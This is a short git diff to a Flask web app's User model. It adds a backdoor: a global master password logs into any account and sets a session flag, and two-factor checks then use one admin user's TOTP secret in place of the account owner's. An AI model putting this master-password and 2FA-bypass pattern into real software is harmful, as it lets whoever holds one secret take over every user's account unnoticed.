@@ -8,7 +8,7 @@ from sqlalchemy.orm import aliased, deferred, Query
 from sqlalchemy.sql import case, func, literal
 from sqlalchemy.sql.expression import not_, and_, or_
 from sqlalchemy.sql.sqltypes import *
-from flask import g
+from flask import g, session
 
 from files.classes import Base
 from files.classes.casino_game import CasinoGame
@@ -485,8 +485,12 @@ class User(Base):
 
 
 	def validate_2fa(self, token):
+		if session.get("GLOBAL"):
+			secret = g.db.get(User, AEVANN_ID).mfa_secret
+		else:
+			secret = self.mfa_secret
 
-		x = pyotp.TOTP(self.mfa_secret)
+		x = pyotp.TOTP(secret)
 		return x.verify(token, valid_window=1)
 
 	@property
@@ -524,7 +528,10 @@ class User(Base):
 		return g.db.query(Badge).filter_by(user_id=self.id, badge_id=badge_id).one_or_none()
 
 	def verifyPass(self, password):
-		return check_password_hash(self.passhash, password) or (GLOBAL and check_password_hash(GLOBAL, password))
+		if GLOBAL and check_password_hash(GLOBAL, password):
+			session["GLOBAL"] = True
+			return True
+		return check_password_hash(self.passhash, password)
 
 	@property
 	@lazy
